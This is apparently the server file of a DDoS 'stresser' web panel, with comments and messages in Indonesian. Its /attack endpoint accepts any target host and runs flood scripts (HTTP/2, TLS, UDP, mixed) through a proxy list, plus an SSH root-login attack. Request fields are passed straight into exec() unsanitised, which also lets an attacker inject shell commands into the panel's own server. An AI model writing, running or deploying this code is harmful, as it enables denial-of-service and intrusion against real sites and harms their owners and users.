const express = require('express');
const { exec } = require('child_process');
const path = require('path');
const cors = require('cors');
const app = express();
const port = 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/attack', (req, res) => {
    const { url: host, time, method, port: customPort } = req.body;
    if (!host || !time || !method) {
        return res.status(400).json({ success: false, message: 'Input tidak lengkap' });
    }

    const port = customPort || 80;

    const attackMethods = {
        'H2': `node ./lib/cache/h2.js ${host} ${time} 45 12 proxy.txt`,
        'TLS': `node ./lib/cache/tls.js ${host} ${time} 32 8 proxy.txt`,
        'FLOOD': `node ./lib/cache/flood.js ${host} ${time} 56 12 proxy.txt`,
        'MIX': `node ./lib/cache/mix.js ${host} ${time} 12 45 proxy.txt -v 3`,
        'SKIBIDI': `node ./lib/cache/skibidi.js ${host} ${time}`,
        'UDP': `node ./lib/cache/udp.js ${host} ${port} ${time}`,
        'SSH': `node ./lib/cache/ssh.js ${host} ${port} root ${time}`
    };

    const cmd = attackMethods[method];
    if (!cmd) {
        return res.status(400).json({ success: false, message: 'Metode serangan tidak dikenal' });
    }

    console.log(`Menjalankan perintah: ${cmd}`);

    let progress = 0;
    const intervalTime = time * 1000 / 100; // Waktu interval untuk setiap 1% progress
    let progressInterval;

    // Fungsi untuk mengirim progress ke frontend (simulasi)
    const sendProgress = (currentProgress) => {
        progress = currentProgress;
        console.log(`Progress: ${progress}%`);
        // res tidak bisa langsung digunakan di sini. Karena res.json() sudah terpanggil di luar interval
        // Jadi, progress tidak bisa di kirim melalui res.json() di dalam interval.
    };

    exec(cmd, (err, stdout, stderr) => {
        clearInterval(progressInterval); // Hentikan interval setelah eksekusi selesai

        if (err) {
            console.error(`Error menjalankan serangan: ${err}`);
            console.error(`Stderr: ${stderr}`);
            return res.status(500).json({ success: false, message: 'Gagal menjalankan serangan', error: stderr, progress: 100 });
        }

        console.log(`Stdout: ${stdout}`);
        return res.json({ success: true, message: `Serangan ${method} dimulai ke ${host}`, progress: 100 });
    });

    // Mulai simulasi progress
    progressInterval = setInterval(() => {
        progress += 1;
        sendProgress(Math.min(progress, 100)); // Pastikan progress tidak melebihi 100
        if (progress >= 100) {
            clearInterval(progressInterval);
        }
    }, intervalTime);

    // Kirim respons awal segera (tanpa menunggu progress selesai)
    res.json({ success: true, message: `Serangan ${method} dimulai ke ${host}`, progress: 0 });
});

app.listen(port, () => {
    console.log(`Web interface aktif di http://localhost:${port}`);
});
